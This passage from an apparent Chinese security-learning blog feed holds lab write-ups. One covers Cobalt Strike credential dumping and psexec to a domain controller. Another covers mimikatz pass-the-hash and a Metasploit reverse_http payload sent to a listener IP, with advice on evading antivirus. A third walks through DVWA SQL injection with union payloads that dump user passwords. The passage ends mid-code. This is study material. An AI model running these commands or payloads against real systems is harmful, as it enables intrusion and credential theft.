+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords //查看计算机内的用户密码</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/13.png" class="">
+
+<p>得到了目标的密码,直接通过cs中psexec模块进行票据传递攻击</p>
+<p>先开启一个SMB服务的监听</p>
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/14.png" class="">
+
+<p>对域控进行psexec攻击</p>
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/15.png" class="">
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/16.png" class="">
+
+<p>同样也可以通过命令行进行传递攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">beacon&gt; make_token SUN\Administrator hongrisec@2019</span><br><span class="line">beacon&gt; jump psexec DC 域控</span><br><span class="line">[+] host called home, sent: 58 bytes</span><br><span class="line">[+] Impersonated NT AUTHORITY\SYSTEM</span><br><span class="line">[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_2835) on DC via Service Control Manager (\\DC\ADMIN$\79a9e06.exe)</span><br><span class="line">[+] host called home, sent: 285790 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Started service 79a9e06 on DC</span><br><span class="line">[+] host called home, sent: 74 bytes</span><br><span class="line">[+] established link to child beacon: 192.168.138.138</span><br></pre></td></tr></table></figure>
+
+<p>最后域控也成功上线</p>
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/17.png" class="">
+
+<h5 id="成功通关"><a href="#成功通关" class="headerlink" title="成功通关!"></a>成功通关!</h5>]]></content>
+      <categories>
+        <category>内网学习</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>thinkphp模板</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透</title>
+    <url>/2021/12/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><p>在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击。</p>
+<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>在域环境内，只有获得了<strong>域管理员</strong>的哈希才可以攻击。我们得到了域管理员administrator的哈希，在这里我们就可以用哈希传递攻击了。</p>
+<p>在前面获得了域管理员 administrator 的NTLM哈希为：a4ee66cc11243b7741dbb83262e7eba4</p>
+<p>NTLM: 就是NT的哈希值，前面的章节已经介绍过</p>
+<p>哈希传递工具 必须借助<code>mimikatz</code></p>
+<blockquote>
+<p><em>Mimikatz是一款可以抓取系统内的明文密码的工具</em></p>
+</blockquote>
+<p>通过蚁剑上传到 web目录</p>
+<span id="more"></span>
+
+<p>在meterpreter中运行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> shell</span><br><span class="line">chcp 65001</span><br><span class="line">cd c:\phpstudy\www</span><br></pre></td></tr></table></figure>
+
+<p>运行命令 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug  #提升权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开始 Pass-The-Hash(hash传递攻击域控服务器  也就是 192.168.52.138）</span><br><span class="line">#格式sekurlsa::pth  /user: 用户名 /domain:域控名 /ntlm: NTLM哈希</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;god.org&quot; /ntlm:a4ee66cc11243b7741dbb83262e7eba4</span><br></pre></td></tr></table></figure>
+
+<p>exit 退出</p>
+<p>我们直接远程执行 域控服务器上的命令</p>
+<p>以下所有的命令是在跳板机上执行。</p>
+<p>这里要在中国蚁剑上面执行，在msf里面 会失败</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.52.138\c$       #查看 C盘目录里面的文件  \\就是网络路径   $就是 根目录的意思</span><br><span class="line">或者</span><br><span class="line">dir \\owa\c$</span><br></pre></td></tr></table></figure>
+
+<p>执行第二台机器上的命令</p>
+<p>还有其他的攻击方式 ，等我们后面讲完漏洞再去学习。</p>
+<h3 id="cobaltstike联动MSF"><a href="#cobaltstike联动MSF" class="headerlink" title="cobaltstike联动MSF"></a>cobaltstike联动MSF</h3><p>首先在CobaltStrike上开启一个监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一                                   个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 192.168.59.134         #cobaltstrike监听的ip   就是服务端的IP</span><br><span class="line">set lport 14444                 #cobaltstrike监听的端口 </span><br><span class="line">set session 1                   #这里是获得的session的id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>我们打开cs 可以看到主机已经上线</p>
+<p>鼠标右键 —会话交互</p>
+<p>因为60秒执行一次命令，要等待的时间太长  我们改为2 秒，实战中不能改的太短，太短会引起防火墙或者杀软注意</p>
+<p>在最下面 beacon  输入 sleep2  </p>
+<p>输入 help查看命令</p>
+<p>输入命令 抓取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令 抓取密码</span><br></pre></td></tr></table></figure>
+
+<p>横向移动：</p>
+<p>鼠标右键 网络探测：</p>
+<p>这里我们新建一个监听器,这个后面要用</p>
+<p>运行完成后要等 几秒</p>
+<p>同样的办法横向移动到域控</p>
+]]></content>
+      <categories>
+        <category>内网学习</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>日志注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入学习</title>
+    <url>/2021/12/26/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h4 id="前端时间实训讲了sql注入-但是因为那段时间只顾着打靶场了没有做笔记-今天完成第三四次作业时发现很多都忘记了-因此做这篇文章一方面分享知识-另一方面记录相关重要知识-方便后续复习回顾"><a href="#前端时间实训讲了sql注入-但是因为那段时间只顾着打靶场了没有做笔记-今天完成第三四次作业时发现很多都忘记了-因此做这篇文章一方面分享知识-另一方面记录相关重要知识-方便后续复习回顾" class="headerlink" title="前端时间实训讲了sql注入,但是因为那段时间只顾着打靶场了没有做笔记,今天完成第三四次作业时发现很多都忘记了,因此做这篇文章一方面分享知识,另一方面记录相关重要知识,方便后续复习回顾"></a>前端时间实训讲了sql注入,但是因为那段时间只顾着打靶场了没有做笔记,今天完成第三四次作业时发现很多都忘记了,因此做这篇文章一方面分享知识,另一方面记录相关重要知识,方便后续复习回顾</h4><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>我将通过DVWA靶场中的sql题目讲解SQL注入</p>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p>SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，前端传入后端的参数是攻击者可控的，攻击者可以通过构造不同的SQL语句来实现对数据库查询、删除，增加，修改数据等等操作，如果数据库的用户权限足够大，还可以对操作系统执行操作.</p>
+<h5 id="类型"><a href="#类型" class="headerlink" title="类型:"></a>类型:</h5><h6 id="依据注入点类型分类"><a href="#依据注入点类型分类" class="headerlink" title="依据注入点类型分类"></a><strong>依据注入点类型分类</strong></h6><p>​    数字类型的注入</p>
+<p>​    字符串类型的注入</p>
+<p>​    搜索型注入</p>
+<span id="more"></span>
+
+<h6 id="依据提交方式分类"><a href="#依据提交方式分类" class="headerlink" title="依据提交方式分类"></a><strong>依据提交方式分类</strong></h6><p>​    GET注入</p>
+<p>​    POST注入</p>
+<p>​    COOKIE注入</p>
+<p>​    HTTP头注入</p>
+<h6 id="依据获取信息的方式分类"><a href="#依据获取信息的方式分类" class="headerlink" title="依据获取信息的方式分类"></a><strong>依据获取信息的方式分类</strong></h6><p>​    基于布尔的盲注</p>
+<p>​    基于时间的盲注</p>
+<p>​    基于报错的注入</p>
+<p>​    联合查询注入</p>
+<h6 id="堆查询注入-可同时执行多条语句"><a href="#堆查询注入-可同时执行多条语句" class="headerlink" title="堆查询注入 (可同时执行多条语句)"></a>堆查询注入 (可同时执行多条语句)</h6><h4 id="首先我们需要对数据库的基础知识有一定的了解"><a href="#首先我们需要对数据库的基础知识有一定的了解" class="headerlink" title="首先我们需要对数据库的基础知识有一定的了解"></a>首先我们需要对数据库的基础知识有一定的了解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql中注释符：# 、/**/ 、 --</span><br><span class="line"></span><br><span class="line">information_schema数据库中三个很重要的表：</span><br><span class="line"></span><br><span class="line">       information_schema.schemata: 该数据表存储了mysql数据库中的所有数据库的库名</span><br><span class="line"></span><br><span class="line">       information_schema.tables： 该数据表存储了mysql数据库中的所有数据表的表名</span><br><span class="line"></span><br><span class="line">       information_schema.columns: 该数据表存储了mysql数据库中的所有列的列名</span><br></pre></td></tr></table></figure>
+
+<h6 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE 库名1 character set utf-8; //创建数据库并库编码集为utf-8 支持中文</span><br></pre></td></tr></table></figure>
+
+<h6 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Product</span><br><span class="line">(字段1     CHAR(4)      NOT NULL,  </span><br><span class="line"> 字段2   VARCHAR(100) NOT NULL,</span><br><span class="line"> 字段3   VARCHAR(32)  NOT NULL,  //字段1,2,3不能为空</span><br><span class="line"> 字段4     INTEGER  );</span><br></pre></td></tr></table></figure>
+
+<p>每一列的数据类型（后述）是必须要指定的，数据类型包括：</p>
+<ul>
+<li>INTEGER 整数型</li>
+<li>NUMERIC ( 全体位数, 小数位数)</li>
+<li>CHAR 字符串,长度不能改变</li>
+<li>VARCHAR 字符串,长度可以改变</li>
+<li>DATE 日期型</li>
+</ul>
+<h6 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段名1,字段名2,字段名3 from 库1.表1 ;//查询库1里面表1的对应记录</span><br></pre></td></tr></table></figure>
+
+<p>当我们只想查找某条记录时,我们可以加上where语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段名1,字段名2,字段名3 from 库1.表1 where 字段名1=&#x27;xx&#x27;; //查询库1里面表1的字段名为1的对应记录</span><br></pre></td></tr></table></figure>
+
+<h6 id="更新语句"><a href="#更新语句" class="headerlink" title="更新语句"></a>更新语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表1</span><br><span class="line">   SET 字段1 = &#x27;xxx&#x27;; //更新表1字段1数据为xxx</span><br></pre></td></tr></table></figure>
+
+<h6 id="删除表语句"><a href="#删除表语句" class="headerlink" title="删除表语句"></a>删除表语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE 表1;</span><br></pre></td></tr></table></figure>
+
+<h4 id="靶场测试"><a href="#靶场测试" class="headerlink" title="靶场测试"></a>靶场测试</h4><p>DVWA靶场</p>
+<p>注:第一次进入靶场,难度默认为impossible,我们需要把他调成对应的难度</p>
+<h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><h6 id="检测是否存在sql注入"><a href="#检测是否存在sql注入" class="headerlink" title="检测是否存在sql注入"></a>检测是否存在sql注入</h6><img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/1.png" class="">
+
+<p>当我们输入1后,他会显示对应的用户信息</p>
+<p>对应源码:这里只展示与我们本题有关的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Get values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br></pre></td></tr></table></figure>
+
+<p>服务器端的low.php并没有对客户输入的id进行任何检查与过滤，直接将SQL语句的执行结果显示给客户端。</p>
+<p>当我们输入1’时查看返回结果</p>
+<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/2.png" class="">
+
+<p>可以确定确实存在sql注入</p>
+<p>当我们输入1时.</p>
+<p>实际传入服务器的语句是SELECT first_name, last_name FROM users WHERE user_id = ‘1’;</p>
+<p>很明显这就是我们刚才讲的sql查询语句,并且可以看到服务器并没有对我们提交的参数进行检查.</p>
+<h6 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h6><p>通过order by 猜测字段数,只有当我们知道了对应的字段数,才能利用union进行下一步的操作</p>
+<p>union介绍</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接。</span><br><span class="line">2.Union中的每个查询必须包含相同的列、表达式或者聚合函数，他们出现的顺序可以不一致（这里指查询字段相同，表不一定一样）</span><br><span class="line">3.列的数据类型必须兼容，兼容的含义是必须是数据库可以隐含的转换他们的类型</span><br></pre></td></tr></table></figure>
+
+<p>对应的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>payload①</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 --  </span><br></pre></td></tr></table></figure>
+
+<p>1后面的’用于将参数之前的’闭合 –后面有一个空格用于注释到参数后面的’ </p>
+<p>order by语句官方介绍</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORDER BY 语句</span><br><span class="line">ORDER BY 语句用于根据指定的列对结果集进行排序。</span><br><span class="line">ORDER BY 语句默认按照升序对记录进行排序。</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/3.png" class="">
+
+<p>可以看到返回结果为不知道的列3在…中</p>
+<p>当我们重新构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 --</span><br></pre></td></tr></table></figure>
+
+<p>发现回显正常.因此可以断定前表共有两个字段.</p>
+<p>再次构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,2 --</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/4.png" class="">
+
+<p>页面回显正常,并且将我们的1,2也给返回到页面中了,因此我们可以在1,2中构造恶意的语句进行查询</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select version(),2 -- </span><br></pre></td></tr></table></figure>
+
+<p>查询数据库版本信息</p>
+<p>前面我们说了三个重要的表,现在他们派上用场了</p>
+<p>如何根据数据库得知其中的数据表呢，我们可以根据information_schema数据库中的schemata，tables,columns三个表格,这三个表格包括了数据库所有的库名,表明和字段名</p>
+<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/5.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select SCHEMA_NAME,2 FROM INFORMATION_SCHEMA.SCHEMATA # //查询所有的数据库名</span><br></pre></td></tr></table></figure>
+
+<p>查到了DVWA数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=&#x27;dvwa&#x27;# //查询DVWA所有的表格</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select user,password from dvwa.users # //查询user表格下的用户名和密码</span><br></pre></td></tr></table></figure>
+
+<p>得到的密码一般为hash,网上有专门的解密网站.</p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_POST[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">    switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">        case MYSQL:</span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Display values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                // Feedback for end user</span><br><span class="line">                echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case SQLITE:</span><br><span class="line">            global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">            #print $query;</span><br><span class="line">            try &#123;</span><br><span class="line">                $results = $sqlite_db_connection-&gt;query($query);</span><br><span class="line">            &#125; catch (Exception $e) &#123;</span><br><span class="line">                echo &#x27;Caught exception: &#x27; . $e-&gt;getMessage();</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ($results) &#123;</span><br><span class="line">                while ($row = $results-&gt;fetchArray()) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[&quot;first_name&quot;];</span><br><span class="line">                    $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;Error in fetch &quot;.$sqlite_db-&gt;lastErrorMsg();</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is used later on in the index.php page</span><br><span class="line">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query  = &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该题为了防止用户直接输入使用了下拉表单，我们可以通过Hackbar提交post请求</p>
+<h5 id="参数后面加’判断是否存在注入"><a href="#参数后面加’判断是否存在注入" class="headerlink" title="参数后面加’判断是否存在注入"></a>参数后面加’判断是否存在注入</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&#x27;&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/6.png" class="">
+
+<p>发现单引号被转义了，大概就是addslashes等类似函数的转义作用，继续测试一下，看看自己的猜测是否准确，由于addslashes转义的字符有（单引号（’） 双引号（”） 反斜杠（\） NULL）,分别测试双引号、&amp;、-等其他字符，发现双引号被转义，但是&amp;等其他字符不会。猜测是否不是字符注入</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=3 order by 4&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/7.png" class="">
+
+<p>果然和我们想的一样,接下来我们就可以用同样的方式获取用户名和密码,但是这里需要注意的是我们构造的payload需要绕过单号的转义</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select database(),version() &amp;Submit=Submit //查询当前所在数据库和对应的版本</span><br></pre></td></tr></table></figure>
+
+<p>‘dvwa’我们可以直接用database()来代替以绕过单引号转义</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=database()&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select user,password from dvwa.users &amp;Submit=Submit</span><br></pre></td></tr></table></figure>
+
+<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_SESSION[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">        case MYSQL:</span><br><span class="line">            // Check database</span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Get values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                // Feedback for end user</span><br><span class="line">                echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        </span><br><span class="line">            break;</span><br><span class="line">        case SQLITE:</span><br><span class="line">            global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br><span class="line">            #print $query;</span><br><span class="line">            try &#123;</span><br><span class="line">                $results = $sqlite_db_connection-&gt;query($query);</span><br><span class="line">            &#125; catch (Exception $e) &#123;</span><br><span class="line">                echo &#x27;Caught exception: &#x27; . $e-&gt;getMessage();</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ($results) &#123;</span><br><span class="line">                while ($row = $results-&gt;fetchArray()) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[&quot;first_name&quot;];</span><br><span class="line">                    $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;Error in fetch &quot;.$sqlite_db-&gt;lastErrorMsg();</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/8.png" class="">
+
+<p>这里我们发现当我们点击change your ID时和我们原先并不是一个页面</p>
+<p>分析源码可知,该题同样是字符型单引号注入,但是服务器限制了我们查询的记录数,每次只允许查询一条,这个我们可以后面通过mysql注释绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>最后payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=&#x27;dvwa&#x27;# //查询DVWA所有的表格</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/9.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select user,password from dvwa.users#</span><br></pre></td></tr></table></figure>
+
+<p>但是最后大家应该都发现了,我们是在得到源代码基础上分析出来的,也就是白盒测试,但是在真实环境中,站点的源代码是不可能让我们所看到了,这就需要我们通过大量的尝试判断.并且这题如果在我们不知道源码的情况下当我们在参数后加’时并不能看到错误回显.这就需要我们有一定的经验,通过大量尝试解决.</p>
+<h5 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h5><p>源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_GET[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Was a number entered?</span><br><span class="line">    if(is_numeric( $id )) &#123;</span><br><span class="line">        $id = intval ($id);</span><br><span class="line">        switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">            case MYSQL:</span><br><span class="line">                // Check the database</span><br><span class="line">                $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );</span><br><span class="line">                $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );</span><br><span class="line">                $data-&gt;execute();</span><br><span class="line">                $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">                // Make sure only 1 result is returned</span><br><span class="line">                if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[ &#x27;first_name&#x27; ];</span><br><span class="line">                    $last  = $row[ &#x27;last_name&#x27; ];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            case SQLITE:</span><br><span class="line">                global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">                $stmt = $sqlite_db_connection-&gt;prepare(&#x27;SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;&#x27; );</span><br><span class="line">                $stmt-&gt;bindValue(&#x27;:id&#x27;,$id,SQLITE3_INTEGER);</span><br><span class="line">                $result = 